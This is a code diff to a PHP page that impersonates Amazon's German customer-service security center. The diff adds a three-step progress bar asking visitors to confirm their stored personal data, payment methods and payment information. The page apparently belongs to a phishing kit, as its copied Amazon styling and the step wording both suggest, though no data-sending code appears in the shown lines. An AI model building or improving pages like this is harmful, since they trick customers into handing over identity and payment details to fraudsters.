@@ -16,6 +16,9 @@
 		<title><?php echo $title ?></title>
 		<link rel="stylesheet" href="src/css/01IP25TkamL.css">
 		<link rel="stylesheet" href="src/css/419ZIIK4ICL.css">
+		<link rel="stylesheet" href="src/font-awesome/css/font-awesome.min.css">
+		<link rel="stylesheet" href="src/css/custom.css?<?php echo time();?>">
+
 		<link href="src/img/favicon.ico" rel="shortcut icon" />
 		<script src="//code.jquery.com/jquery-1.11.0.min.js"></script>
 		<script type="text/javascript">
@@ -185,9 +188,30 @@
 					Amazon - Kundenservice Sicherheitscenter
 				</h1>
 			</div>
-			
 			<table id="cs-content-table" cellspacing="0" cellpadding="0" border="0" width="100%">
 				<tbody>
+				<tr>
+					<td>
+						<div class="f1-steps">
+							<div class="f1-progress">
+								<div class="f1-progress-line" data-now-value="16.66" data-number-of-steps="3" style="width: 49.99333333333334%;"></div>
+							</div>
+							<div class="f1-step activated">
+								<div class="f1-step-icon"><i class="fa fa-user"></i></div>
+								<p>Bestätigung der hinterlegten persönlichen Daten</p>
+							</div>
+							<div class="f1-step active">
+								<div class="f1-step-icon"><i class="fa fa-dollar"></i></div>
+								<p>Bestätigung der hinterlegten Zahlungsmittel</p>
+							</div>
+							<div class="f1-step">
+								<div class="f1-step-icon"><i class="fa fa-check"></i></div>
+								<p>Zahlungsinformationen bestätigen</p>
+							</div>
+						</div>						
+					</td>
+					<td></td>
+				</tr>
 				<tr>
 					<td valign="top" width="70%">
 						<div class="leftcol">
